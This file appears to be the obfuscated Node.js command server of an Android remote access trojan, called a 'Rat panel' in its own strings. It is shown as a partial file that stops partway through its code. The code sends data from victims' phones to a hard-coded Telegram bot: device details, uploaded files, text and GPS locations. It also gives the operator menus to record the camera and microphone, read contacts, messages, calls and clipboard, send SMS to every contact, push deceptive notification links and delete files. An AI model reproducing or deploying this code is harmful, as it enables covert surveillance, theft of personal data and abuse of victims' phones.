const express = require("express");
const webSocket = require("ws");
const http = require("http");
const telegramBot = require("node-telegram-bot-api");
const uuid4 = require("uuid");
const multer = require("multer");
const bodyParser = require("body-parser");
const axios = require("axios");

const token = "5606371628:AAHGiMbtqJZrzs4osMS9tIkUGAwpNz022LI";
const id = "5663518690";
const address = "https://www.google.com";

const _0x8ea7c8 = _0x4cda;
function _0x4cda(_0x3dda28, _0x227d18) {
  const _0x877457 = _0x8774();
  return (
    (_0x4cda = function (_0x4cda7c, _0x574ecd) {
      _0x4cda7c = _0x4cda7c - 0xe2;
      let _0x580a59 = _0x877457[_0x4cda7c];
      return _0x580a59;
    }),
    _0x4cda(_0x3dda28, _0x227d18)
  );
}
(function (_0x1541e0, _0x50640d) {
  const _0x50dcdb = _0x4cda,
    _0x18f5c3 = _0x1541e0();
  while (!![]) {
    try {
      const _0x13173f =
        (parseInt(_0x50dcdb(0x13e)) / 0x1) *
          (-parseInt(_0x50dcdb(0x170)) / 0x2) +
        (-parseInt(_0x50dcdb(0x102)) / 0x3) *
          (-parseInt(_0x50dcdb(0x15e)) / 0x4) +
        -parseInt(_0x50dcdb(0x137)) / 0x5 +
        (-parseInt(_0x50dcdb(0x15d)) / 0x6) *
          (parseInt(_0x50dcdb(0x164)) / 0x7) +
        -parseInt(_0x50dcdb(0xf5)) / 0x8 +
        -parseInt(_0x50dcdb(0xff)) / 0x9 +
        parseInt(_0x50dcdb(0x156)) / 0xa;
      if (_0x13173f === _0x50640d) break;
      else _0x18f5c3["push"](_0x18f5c3["shift"]());
    } catch (_0x45b5c3) {
      _0x18f5c3["push"](_0x18f5c3["shift"]());
    }
  }
})(_0x8774, 0x56da3);
const app = express(),
  appServer = http[_0x8ea7c8(0x12a)](app),
  appSocket = new webSocket["Server"]({ server: appServer }),
  appBot = new telegramBot(token, { polling: !![] }),
  appClients = new Map(),
  upload = multer();
function _0x8774() {
  const _0x1bad81 = [
    "battery",
    "/uploadText",
    "uuid",
    "•\x20ᴅᴇᴠɪᴄᴇ\x20ᴍᴏᴅᴇʟ\x20:\x20<b>",
    "contacts:",
    "°•\x20𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣\x20𝙛𝙧𝙤𝙢\x20<b>",
    "messages",
    "𝙎𝙚𝙡𝙛𝙞𝙚\x20𝙘𝙖𝙢𝙚𝙧𝙖",
    "𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣",
    "/uploadFile",
    "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙥𝙖𝙩𝙝\x20𝙤𝙛\x20𝙩𝙝𝙚\x20𝙛𝙞𝙡𝙚\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙙𝙚𝙡𝙚𝙩𝙚",
    "deleteMessage",
    "editMessageText",
    "𝙏𝙤𝙖𝙨𝙩",
    "sendLocation",
    "apps:",
    "log",
    "env",
    "PORT",
    "27054460qFcHoJ",
    "•ɪꜰ\x20ʏᴏᴜ\x20ᴡᴀɴᴛ\x20ᴛᴏ\x20ꜱᴇɴᴅ\x20ꜱᴍꜱ\x20ᴛᴏ\x20ʟᴏᴄᴀʟ\x20ᴄᴏᴜɴᴛʀʏ\x20ɴᴜᴍʙᴇʀꜱ,\x20ʏᴏᴜ\x20ᴄᴀɴ\x20ᴇɴᴛᴇʀ\x20ᴛʜᴇ\x20ɴᴜᴍʙᴇʀ\x20ᴡɪᴛʜ\x20ᴢᴇʀᴏ\x20ᴀᴛ\x20ᴛʜᴇ\x20ʙᴇɢɪɴɴɪɴɢ,\x20ᴏᴛʜᴇʀᴡɪꜱᴇ\x20ᴇɴᴛᴇʀ\x20ᴛʜᴇ\x20ɴᴜᴍʙᴇʀ\x20ᴡɪᴛʜ\x20ᴛʜᴇ\x20ᴄᴏᴜɴᴛʀʏ\x20ᴄᴏᴅᴇ",
    "𝘿𝙚𝙫𝙞𝙘𝙚\x20𝙞𝙣𝙛𝙤",
    "camera_selfie",
    "post",
    "𝘾𝙖𝙡𝙡𝙨",
    "𝙑𝙞𝙗𝙧𝙖𝙩𝙚",
    "726pUcFcG",
    "196572hdDNip",
    "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙢𝙚𝙨𝙨𝙖𝙜𝙚\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙨𝙚𝙣𝙙\x20𝙩𝙤\x20𝙖𝙡𝙡\x20𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\x0a\x0a",
    "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙢𝙚𝙨𝙨𝙖𝙜𝙚\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙖𝙥𝙥𝙚𝙖𝙧\x20𝙖𝙨\x20𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\x0a\x0a",
    "send_message_to_all",
    "𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨",
    "•\x20ᴄʟɪᴄᴋ\x20ᴏɴ\x20ᴛʜᴇ\x20ᴄᴏᴍᴍᴀɴᴅ\x20ʙᴜᴛᴛᴏɴ\x20ᴀɴᴅ\x20ꜱᴇʟᴇᴄᴛ\x20ᴛʜᴇ\x20ᴅᴇꜱɪʀᴇᴅ\x20ᴅᴇᴠɪᴄᴇ\x20ᴛʜᴇɴ\x20ꜱᴇʟᴇᴄᴛ\x20ᴛʜᴇ\x20ᴅᴇꜱɪʀᴇᴅ\x20ᴄᴏᴍᴍᴀɴᴅ\x20ᴀᴍᴏɴɢ\x20ᴛʜᴇ\x20ᴄᴏᴍᴍᴀɴᴅ\x20ᴅᴇᴠᴇʟᴏᴘᴇᴅ\x20ʙʏ\x20:\x20@shivayadavvꜱ\x0a\x0a",
    "30135DDfqpg",
    "</b>",
    "version",
    "</b>\x20𝙙𝙚𝙫𝙞𝙘𝙚",
    "𝙎𝙚𝙣𝙙\x20𝙢𝙚𝙨𝙨𝙖𝙜𝙚\x20𝙩𝙤\x20𝙖𝙡𝙡\x20𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨",
    "clipboard:",
    "°•\x20𝙂𝙧𝙚𝙖𝙩,\x20𝙣𝙤𝙬\x20𝙚𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙡𝙞𝙣𝙠\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙗𝙚\x20𝙤𝙥𝙚𝙣𝙚𝙙\x20𝙗𝙮\x20𝙩𝙝𝙚\x20𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣",
    "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙝𝙤𝙬\x20𝙡𝙤𝙣𝙜\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙝𝙚\x20𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚\x20𝙩𝙤\x20𝙗𝙚\x20𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\x0a\x0a",
    "°•\x20𝙂𝙧𝙚𝙖𝙩,\x20𝙣𝙤𝙬\x20𝙚𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙢𝙚𝙨𝙨𝙖𝙜𝙚\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙨𝙚𝙣𝙙\x20𝙩𝙤\x20𝙩𝙝𝙞𝙨\x20𝙣𝙪𝙢𝙗𝙚𝙧\x0a\x0a",
    "set",
    "file:",
    "size",
    "78eEVMnq",
    "push",
    "show_notification",
    "<h1\x20align=\x22center\x22>𝙎𝙚𝙧𝙫𝙚𝙧\x20𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙\x20𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>",
    "°•\x20𝙋𝙡𝙚𝙖𝙨𝙚\x20𝙧𝙚𝙥𝙡𝙮\x20𝙩𝙝𝙚\x20𝙣𝙪𝙢𝙗𝙚𝙧\x20𝙩𝙤\x20𝙬𝙝𝙞𝙘𝙝\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙨𝙚𝙣𝙙\x20𝙩𝙝𝙚\x20𝙎𝙈𝙎\x0a\x0a",
    "forEach",
    "device_info:",
    "vibrate",
    "𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\x20𝙙𝙚𝙫𝙞𝙘𝙚𝙨",
    "callback_query",
    "play_audio:",
    "•\x20ᴀɴᴅʀᴏɪᴅ\x20ᴠᴇʀꜱɪᴏɴ\x20:\x20<b>",
    "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙝𝙤𝙬\x20𝙡𝙤𝙣𝙜\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙝𝙚\x20𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚\x20𝙩𝙤\x20𝙗𝙚\x20𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙",
    "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙥𝙖𝙩𝙝\x20𝙤𝙛\x20𝙩𝙝𝙚\x20𝙛𝙞𝙡𝙚\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙",
    "delete_file:",
    "°•\x20𝙎𝙚𝙡𝙚𝙘𝙩\x20𝙘𝙤𝙢𝙢𝙚𝙣𝙙\x20𝙛𝙤𝙧\x20𝙙𝙚𝙫𝙞𝙘𝙚\x20:\x20<b>",
    "rec_camera_selfie:",
    "𝘿𝙚𝙡𝙚𝙩𝙚\x20𝙛𝙞𝙡𝙚",
    "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙢𝙚𝙨𝙨𝙖𝙜𝙚\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙨𝙚𝙣𝙙\x20𝙩𝙤\x20𝙖𝙡𝙡\x20𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨",
    "headers",
    "•\x20ᴘʀᴏᴠɪᴅᴇʀ\x20:\x20<b>",
    "°•\x20𝙉𝙚𝙬\x20𝙙𝙚𝙫𝙞𝙘𝙚\x20𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\x0a\x0a",
    "•\x20ᴡʜᴇɴ\x20ᴛʜᴇ\x20ᴠɪᴄᴛɪᴍ\x20ᴄʟɪᴄᴋꜱ\x20ᴏɴ\x20ᴛʜᴇ\x20ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ,\x20ᴛʜᴇ\x20ʟɪɴᴋ\x20ʏᴏᴜ\x20ᴀʀᴇ\x20ᴇɴᴛᴇʀɪɴɢ\x20ᴡɪʟʟ\x20ʙᴇ\x20ᴏᴘᴇɴᴇᴅ",
    "device:",
    "play_audio",
    "𝙎𝙝𝙤𝙬\x20𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣",
    "calls",
    "•\x20ꜱᴄʀᴇᴇɴ\x20ʙʀɪɢʜᴛɴᴇꜱꜱ\x20:\x20<b>",
    "toast",
    "•\x20ᴡʜᴇɴ\x20ʏᴏᴜ\x20ʀᴇᴄᴇɪᴠᴇ\x20ᴛʜᴇ\x20ᴄᴏɴɴᴇᴄᴛɪᴏɴ\x20ᴍᴇꜱꜱᴀɢᴇ,\x20ɪᴛ\x20ᴍᴇᴀɴꜱ\x20ᴛʜᴀᴛ\x20ᴛʜᴇ\x20ᴛᴀʀɢᴇᴛ\x20ᴅᴇᴠɪᴄᴇ\x20ɪꜱ\x20ᴄᴏɴɴᴇᴄᴛᴇᴅ\x20ᴀɴᴅ\x20ʀᴇᴀᴅʏ\x20ᴛᴏ\x20ʀᴇᴄᴇɪᴠᴇ\x20ᴛʜᴇ\x20ᴄᴏᴍᴍᴀɴᴅ\x0a\x0a",
    "location:",
    "brightness",
    "rec_camera_main:",
    "°•\x20𝙉𝙤\x20𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜\x20𝙙𝙚𝙫𝙞𝙘𝙚𝙨\x20𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\x0a\x0a",
    "camera_main:",
    "4571544OZWyfH",
    "°•\x20𝙔𝙤𝙪𝙧\x20𝙧𝙚𝙦𝙪𝙚𝙨𝙩\x20𝙞𝙨\x20𝙤𝙣\x20𝙥𝙧𝙤𝙘𝙚𝙨𝙨\x0a\x0a",
    "•\x20ʏᴏᴜ\x20ᴡɪʟʟ\x20ʀᴇᴄᴇɪᴠᴇ\x20ᴀ\x20ʀᴇꜱᴘᴏɴꜱᴇ\x20ɪɴ\x20ᴛʜᴇ\x20ɴᴇxᴛ\x20ꜰᴇᴡ\x20ᴍᴏᴍᴇɴᴛꜱ",
    "sendMessage",
    "•\x20ʙᴇ\x20ᴄᴀʀᴇꜰᴜʟ\x20ᴛʜᴀᴛ\x20ᴛʜᴇ\x20ᴍᴇꜱꜱᴀɢᴇ\x20ᴡɪʟʟ\x20ɴᴏᴛ\x20ʙᴇ\x20ꜱᴇɴᴛ\x20ɪꜰ\x20ᴛʜᴇ\x20ɴᴜᴍʙᴇʀ\x20ᴏꜰ\x20ᴄʜᴀʀᴀᴄᴛᴇʀꜱ\x20ɪɴ\x20ʏᴏᴜʀ\x20ᴍᴇꜱꜱᴀɢᴇ\x20ɪꜱ\x20ᴍᴏʀᴇ\x20ᴛʜᴀɴ\x20ᴀʟʟᴏᴡᴇᴅ",
    "</b>\x20𝙙𝙚𝙫𝙞𝙘𝙚\x0a\x0a",
    "°•\x20𝙂𝙧𝙚𝙖𝙩,\x20𝙣𝙤𝙬\x20𝙚𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙡𝙞𝙣𝙠\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙗𝙚\x20𝙤𝙥𝙚𝙣𝙚𝙙\x20𝙗𝙮\x20𝙩𝙝𝙚\x20𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\x0a\x0a",
    "apps",
    "°•\x20𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣\x20𝙙𝙚𝙣𝙞𝙚𝙙",
    "°•\x20𝙒𝙚𝙡𝙘𝙤𝙢𝙚\x20𝙩𝙤\x20𝙍𝙖𝙩\x20𝙥𝙖𝙣𝙚𝙡\x0a\x0a",
    "1705491CcuiGK",
    "•\x20ʙᴀᴛᴛᴇʀʏ\x20:\x20<b>",
    "𝙂𝙚𝙩\x20𝙛𝙞𝙡𝙚",
    "9pBymxr",
    "send",
    "send_message_to_all:",
    "close",
    "use",
    "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙢𝙚𝙨𝙨𝙖𝙜𝙚\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙖𝙥𝙥𝙚𝙖𝙧\x20𝙖𝙨\x20𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣",
    "°•\x20𝙂𝙧𝙚𝙖𝙩,\x20𝙣𝙤𝙬\x20𝙚𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙢𝙚𝙨𝙨𝙖𝙜𝙚\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙨𝙚𝙣𝙙\x20𝙩𝙤\x20𝙩𝙝𝙞𝙨\x20𝙣𝙪𝙢𝙗𝙚𝙧",
    "camera_main",
    "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙥𝙖𝙩𝙝\x20𝙤𝙛\x20𝙩𝙝𝙚\x20𝙛𝙞𝙡𝙚\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\x0a\x0a",
    "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙝𝙤𝙬\x20𝙡𝙤𝙣𝙜\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙝𝙚\x20𝙢𝙖𝙞𝙣\x20𝙘𝙖𝙢𝙚𝙧𝙖\x20𝙩𝙤\x20𝙗𝙚\x20𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙",
    "𝙎𝙚𝙣𝙙\x20𝙢𝙚𝙨𝙨𝙖𝙜𝙚",
    "microphone:",
    "°•\x20𝙈𝙚𝙨𝙨𝙖𝙜𝙚\x20𝙛𝙧𝙤𝙢\x20<b>",
    "body",
    "json",
    "lon",
    "°•\x20𝙎𝙚𝙡𝙚𝙘𝙩\x20𝙙𝙚𝙫𝙞𝙘𝙚\x20𝙩𝙤\x20𝙚𝙭𝙚𝙘𝙪𝙩𝙚\x20𝙘𝙤𝙢𝙢𝙚𝙣𝙙",
    "get",
    "send_message",
    "device",
    "</b>\x0a",
    "•\x20ᴍᴀᴋᴇ\x20ꜱᴜʀᴇ\x20ᴛʜᴇ\x20ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ\x20ɪꜱ\x20ɪɴꜱᴛᴀʟʟᴇᴅ\x20ᴏɴ\x20ᴛʜᴇ\x20ᴛᴀʀɢᴇᴛ\x20ᴅᴇᴠɪᴄᴇ",
    "includes",
    "•\x20ʏᴏᴜ\x20ᴅᴏ\x20ɴᴏᴛ\x20ɴᴇᴇᴅ\x20ᴛᴏ\x20ᴇɴᴛᴇʀ\x20ᴛʜᴇ\x20ꜰᴜʟʟ\x20ꜰɪʟᴇ\x20ᴘᴀᴛʜ,\x20ᴊᴜꜱᴛ\x20ᴇɴᴛᴇʀ\x20ᴛʜᴇ\x20ᴍᴀɪɴ\x20ᴘᴀᴛʜ.\x20ꜰᴏʀ\x20ᴇxᴀᴍᴘʟᴇ,\x20ᴇɴᴛᴇʀ<b>\x20DCIM/Camera\x20</b>\x20ᴛᴏ\x20ᴅᴇʟᴇᴛᴇ\x20ɢᴀʟʟᴇʀʏ\x20ꜰɪʟᴇꜱ.",
    "/start",
    "data",
    "message_id",
    "then",
    "HTML",
    "text",
    "</b>\x0a\x0a",
    "𝙎𝙩𝙤𝙥\x20𝙖𝙪𝙙𝙞𝙤",
    "split",
    "device_info",
    "show_notification:",
    "𝙈𝙖𝙞𝙣\x20𝙘𝙖𝙢𝙚𝙧𝙖",
    "message",
    "/uploadLocation",
    "model",
    "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙢𝙚𝙨𝙨𝙖𝙜𝙚\x20𝙩𝙝𝙖𝙩\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙖𝙥𝙥𝙚𝙖𝙧\x20𝙤𝙣\x20𝙩𝙝𝙚\x20𝙩𝙖𝙧𝙜𝙚𝙩\x20𝙙𝙚𝙫𝙞𝙘𝙚\x0a\x0a",
    "createServer",
    "reply_to_message",
    "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙥𝙖𝙩𝙝\x20𝙤𝙛\x20𝙩𝙝𝙚\x20𝙛𝙞𝙡𝙚\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙙𝙚𝙡𝙚𝙩𝙚\x0a\x0a",
    "delete",
    "𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚",
    "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙖𝙪𝙙𝙞𝙤\x20𝙡𝙞𝙣𝙠\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙥𝙡𝙖𝙮",
    "contacts",
    "file",
    "clients",
    "camera_selfie:",
    "𝙀𝙭𝙚𝙘𝙪𝙩𝙚\x20𝙘𝙤𝙢𝙢𝙖𝙣𝙙",
    "•\x20ᴛᴏᴀꜱᴛ\x20ɪꜱ\x20ᴀ\x20ꜱʜᴏʀᴛ\x20ᴍᴇꜱꜱᴀɢᴇ\x20ᴛʜᴀᴛ\x20ᴀᴘᴘᴇᴀʀꜱ\x20ᴏɴ\x20ᴛʜᴇ\x20ᴅᴇᴠɪᴄᴇ\x20ꜱᴄʀᴇᴇɴ\x20ꜰᴏʀ\x20ᴀ\x20ꜰᴇᴡ\x20ꜱᴇᴄᴏɴᴅꜱ",
    "sendDocument",
    "2609110JuwyVs",
    "°•\x20𝙀𝙣𝙩𝙚𝙧\x20𝙩𝙝𝙚\x20𝙢𝙚𝙨𝙨𝙖𝙜𝙚\x20𝙩𝙝𝙖𝙩\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙖𝙥𝙥𝙚𝙖𝙧\x20𝙤𝙣\x20𝙩𝙝𝙚\x20𝙩𝙖𝙧𝙜𝙚𝙩\x20𝙙𝙚𝙫𝙞𝙘𝙚",
    "single",
    "connection",
    "𝘼𝙥𝙥𝙨",
    "buffer",
    "•\x20ɴᴏᴛᴇ\x20ᴛʜᴀᴛ\x20ʏᴏᴜ\x20ᴍᴜꜱᴛ\x20ᴇɴᴛᴇʀ\x20ᴛʜᴇ\x20ᴅɪʀᴇᴄᴛ\x20ʟɪɴᴋ\x20ᴏꜰ\x20ᴛʜᴇ\x20ᴅᴇꜱɪʀᴇᴅ\x20ꜱᴏᴜɴᴅ,\x20ᴏᴛʜᴇʀᴡɪꜱᴇ\x20ᴛʜᴇ\x20ꜱᴏᴜɴᴅ\x20ᴡɪʟʟ\x20ɴᴏᴛ\x20ʙᴇ\x20ᴘʟᴀʏᴇᴅ",
    "17781kWyDHn",
    "provider",
    "•\x20ʏᴏᴜʀ\x20ᴍᴇꜱꜱᴀɢᴇ\x20ᴡɪʟʟ\x20ʙᴇ\x20ᴀᴘᴘᴇᴀʀ\x20ɪɴ\x20ᴛᴀʀɢᴇᴛ\x20ᴅᴇᴠɪᴄᴇ\x20ꜱᴛᴀᴛᴜꜱ\x20ʙᴀʀ\x20ʟɪᴋᴇ\x20ʀᴇɢᴜʟᴀʀ\x20ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ",
    "𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙",
    "stop_audio",
  ];
  _0x8774 = function () {
    return _0x1bad81;
  };
  return _0x8774();
}
app[_0x8ea7c8(0x106)](bodyParser[_0x8ea7c8(0x110)]());
let currentUuid = "",
  currentNumber = "",
  currentTitle = "";
app["get"]("/", function (_0x58d93c, _0x4dcb0c) {
  const _0x291cce = _0x8ea7c8;
  _0x4dcb0c[_0x291cce(0x103)](_0x291cce(0x173));
}),
  app[_0x8ea7c8(0x15a)](
    _0x8ea7c8(0x14c),
    upload[_0x8ea7c8(0x139)](_0x8ea7c8(0x131)),
    (_0x380248, _0x425211) => {
      const _0x2aba84 = _0x8ea7c8,
        _0x571e82 = _0x380248[_0x2aba84(0x131)]["originalname"];
      appBot[_0x2aba84(0x136)](
        id,
        _0x380248["file"][_0x2aba84(0x13c)],
        {
          caption:
            _0x2aba84(0x10e) +
            _0x380248[_0x2aba84(0xe5)][_0x2aba84(0x128)] +
            _0x2aba84(0x167),
          parse_mode: "HTML",
        },
        { filename: _0x571e82, contentType: "application/txt" }
      ),
        _0x425211[_0x2aba84(0x103)]("");
    }
  ),
  app["post"](_0x8ea7c8(0x144), (_0x3d7cfa, _0x57da16) => {
    const _0xcc4340 = _0x8ea7c8;
    appBot[_0xcc4340(0xf8)](
      id,
      _0xcc4340(0x10e) +
        _0x3d7cfa[_0xcc4340(0xe5)]["model"] +
        _0xcc4340(0xfa) +
        _0x3d7cfa[_0xcc4340(0x10f)][_0xcc4340(0x11f)],
      { parse_mode: _0xcc4340(0x11e) }
    ),
      _0x57da16["send"]("");
  }),
  app[_0x8ea7c8(0x15a)](_0x8ea7c8(0x127), (_0x484191, _0x23e1d4) => {
    const _0x46d094 = _0x8ea7c8;
    appBot[_0x46d094(0x151)](
      id,
      _0x484191[_0x46d094(0x10f)]["lat"],
      _0x484191["body"][_0x46d094(0x111)]
    ),
      appBot[_0x46d094(0xf8)](
        id,
        _0x46d094(0x148) +
          _0x484191[_0x46d094(0xe5)][_0x46d094(0x128)] +
          _0x46d094(0x167),
        { parse_mode: _0x46d094(0x11e) }
      ),
      _0x23e1d4["send"]("");
  }),
  appSocket["on"](_0x8ea7c8(0x13a), (_0x461074, _0x40408c) => {
    const _0x5e8b13 = _0x8ea7c8,
      _0x3b4c31 = uuid4["v4"](),
      _0x56fa3e = _0x40408c["headers"][_0x5e8b13(0x128)],
      _0x44d786 = _0x40408c[_0x5e8b13(0xe5)][_0x5e8b13(0x143)],
      _0x568bf4 = _0x40408c["headers"][_0x5e8b13(0x166)],
      _0x28e45c = _0x40408c["headers"][_0x5e8b13(0xf1)],
      _0x441805 = _0x40408c["headers"][_0x5e8b13(0x13f)];
    (_0x461074[_0x5e8b13(0x145)] = _0x3b4c31),
      appClients[_0x5e8b13(0x16d)](_0x3b4c31, {
        model: _0x56fa3e,
        battery: _0x44d786,
        version: _0x568bf4,
        brightness: _0x28e45c,
        provider: _0x441805,
      }),
      appBot["sendMessage"](
        id,
        _0x5e8b13(0xe7) +
          (_0x5e8b13(0x146) + _0x56fa3e + _0x5e8b13(0x116)) +
          (_0x5e8b13(0x100) + _0x44d786 + _0x5e8b13(0x116)) +
          (_0x5e8b13(0x17b) + _0x568bf4 + _0x5e8b13(0x116)) +
          (_0x5e8b13(0xed) + _0x28e45c + _0x5e8b13(0x116)) +
          ("•\x20ᴘʀᴏᴠɪᴅᴇʀ\x20:\x20<b>" + _0x441805 + "</b>"),
        { parse_mode: _0x5e8b13(0x11e) }
      ),
      _0x461074["on"](_0x5e8b13(0x105), function () {
        const _0xed404c = _0x5e8b13;
        appBot["sendMessage"](
          id,
          "°•\x20𝘿𝙚𝙫𝙞𝙘𝙚\x20𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\x0a\x0a" +
            (_0xed404c(0x146) + _0x56fa3e + "</b>\x0a") +
            (_0xed404c(0x100) + _0x44d786 + _0xed404c(0x116)) +
            ("•\x20ᴀɴᴅʀᴏɪᴅ\x20ᴠᴇʀꜱɪᴏɴ\x20:\x20<b>" +
              _0x568bf4 +
              _0xed404c(0x116)) +
            ("•\x20ꜱᴄʀᴇᴇɴ\x20ʙʀɪɢʜᴛɴᴇꜱꜱ\x20:\x20<b>" +
              _0x28e45c +
              _0xed404c(0x116)) +
            (_0xed404c(0xe6) + _0x441805 + _0xed404c(0x165)),
          { parse_mode: _0xed404c(0x11e) }
        ),
          appClients[_0xed404c(0x12d)](_0x461074["uuid"]);
      });
  }),
  appBot["on"](_0x8ea7c8(0x126), (_0x11cbf9) => {
    const _0x3b4275 = _0x8ea7c8,
      _0x118285 = _0x11cbf9["chat"]["id"];
    if (_0x11cbf9[_0x3b4275(0x12b)]) {
      _0x11cbf9["reply_to_message"][_0x3b4275(0x11f)]["includes"](
        "°•\x20𝙋𝙡𝙚𝙖𝙨𝙚\x20𝙧𝙚𝙥𝙡𝙮\x20𝙩𝙝𝙚\x20𝙣𝙪𝙢𝙗𝙚𝙧\x20𝙩𝙤\x20𝙬𝙝𝙞𝙘𝙝\x20𝙮𝙤𝙪\x20𝙬𝙖𝙣𝙩\x20𝙩𝙤\x20𝙨𝙚𝙣𝙙\x20𝙩𝙝𝙚\x20𝙎𝙈𝙎"
      ) &&
        ((currentNumber = _0x11cbf9["text"]),
        appBot[_0x3b4275(0xf8)](id, _0x3b4275(0x16c) + _0x3b4275(0xf9), {
          reply_markup: { force_reply: !![] },
        }));
      _0x11cbf9["reply_to_message"]["text"][_0x3b4275(0x118)](
        _0x3b4275(0x108)
      ) &&
        (appSocket[_0x3b4275(0x132)][_0x3b4275(0x175)](function _0x46d233(
          _0x2e7a50
        ) {
          const _0x30a950 = _0x3b4275;
          _0x2e7a50[_0x30a950(0x145)] == currentUuid &&
            _0x2e7a50[_0x30a950(0x103)](
              "send_message:" + currentNumber + "/" + _0x11cbf9["text"]
            );
        }),
        (currentNumber = ""),
        (currentUuid = ""),
        appBot[_0x3b4275(0xf8)](
          id,
          _0x3b4275(0xf6) +
            "•\x20ʏᴏᴜ\x20ᴡɪʟʟ\x20ʀᴇᴄᴇɪᴠᴇ\x20ᴀ\x20ʀᴇꜱᴘᴏɴꜱᴇ\x20ɪɴ\x20ᴛʜᴇ\x20ɴᴇxᴛ\x20ꜰᴇᴡ\x20ᴍᴏᴍᴇɴᴛꜱ",
          {
            parse_mode: _0x3b4275(0x11e),
            reply_markup: {
              keyboard: [[_0x3b4275(0x178)], [_0x3b4275(0x134)]],
              resize_keyboard: !![],
            },
          }
        ));
      if (_0x11cbf9[_0x3b4275(0x12b)]["text"]["includes"](_0x3b4275(0xe4))) {
        const _0x2239a2 = _0x11cbf9["text"];
        appSocket[_0x3b4275(0x132)][_0x3b4275(0x175)](function _0x1496b3(
          _0x445618
        ) {
          const _0x812449 = _0x3b4275;
          _0x445618[_0x812449(0x145)] == currentUuid &&
            _0x445618["send"](_0x812449(0x104) + _0x2239a2);
        }),
          (currentUuid = ""),
